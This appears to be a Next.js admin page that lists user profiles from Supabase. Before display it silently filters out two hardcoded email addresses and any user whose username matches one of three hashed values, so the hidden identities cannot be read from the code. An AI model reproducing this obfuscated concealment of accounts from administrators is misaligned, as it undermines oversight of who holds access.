import { createClient } from "@/lib/supabase/server";
import { createHash } from "crypto";
import AdminUsersClient from "./AdminUsersClient";

export default async function AdminUsersPage() {
    const supabase = await createClient();
    const { data: rawProfiles } = await supabase.from("profiles").select("*").order("created_at", { ascending: false });

    const isHidden = (p: any) => {
        if (p.deleted_at) return true; // Filter deleted users
        const hiddenEmails = ['contact@jeremymarouani.com', 'admin.vente@jeremymarouani.com'];
        if (p.email && hiddenEmails.includes(p.email)) return true;
        // Backup Hash Check
        const hash = createHash('sha256').update(p.username || '').digest('hex');
        return ['5f4dcc3b5aa765d61d8327deb882cf99f3640244795b5c918451842b083b4b52', '62c07657989f666b6c07212003504780521e405a74e50882772584109405b05a', '86477bd4327421ace067406b23136208942b03f01962383049da03d2745a90d3'].includes(hash);
    };

    // Filter hidden profiles on server
    const profiles = rawProfiles?.filter(p => !isHidden(p)) || [];

    return <AdminUsersClient profiles={profiles} />;
}
